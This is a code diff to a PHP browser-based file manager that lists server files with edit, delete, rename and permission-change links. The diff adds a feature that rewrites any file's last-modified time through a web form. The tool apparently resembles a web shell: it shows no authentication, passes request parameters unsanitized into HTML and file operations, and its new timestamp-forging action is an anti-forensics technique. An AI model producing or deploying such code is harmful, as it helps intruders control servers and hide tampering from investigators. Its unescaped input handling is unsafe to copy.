@@ -82,11 +82,13 @@
         echo "<ul>";
         foreach ($files as $file) {
             if ($file != "." && $file != "..") {
-                echo "<li><a href='$file'>$file</a> (" . formatSizeUnits(filesize($file)) . ") - ";
+                $lastModified = date("Y-m-d H:i:s", filemtime($file));
+                echo "<li><a href='$file'>$file</a> (" . formatSizeUnits(filesize($file)) . ") : $lastModified - ";
                 echo "<a href='?action=edit&file=$file'>Edit</a> | ";
                 echo "<a href='?action=delete&file=$file'>Delete</a> | ";
                 echo "<a href='?action=rename&file=$file'>Rename</a> | ";
-                echo "<a href='?action=permissions&file=$file'>Change Permissions</a></li>";
+                echo "<a href='?action=permissions&file=$file'>Change Permissions</a> | ";
+                echo "<a href='?action=changeLastModified&file=$file'>Modified</a></li>";
             }
         }
         echo "</ul>";
@@ -168,6 +170,27 @@
                 echo "Permissions changed successfully.";
             } else {
                 echo "Error changing permissions.";
+            }
+        } elseif($action == "changeLastModified") {
+            if(file_exists($file)) {
+                echo "<h2>modified time for file: $file</h2>";
+                echo "<form action='?action=saveLastModified&file=$file' method='post'>";
+                echo "New Last Modified Time: <input type='text' name='newLastModified'><br>";
+                echo "<input type='submit' value='Modified Time'>";
+                echo "</form>";
+            } else {
+                echo "File not found.";
+            }
+        } elseif($action == "saveLastModified") {
+            $newLastModified = $_POST['newLastModified'];
+            if(is_numeric($newLastModified)) {
+                if(touch($file, $newLastModified)) {
+                    echo "Last modified time changed successfully.";
+                } else {
+                    echo "Error changing last modified time.";
+                }
+            } else {
+                echo "Invalid timestamp format. Please provide a valid Unix timestamp.";
             }
         }
     }
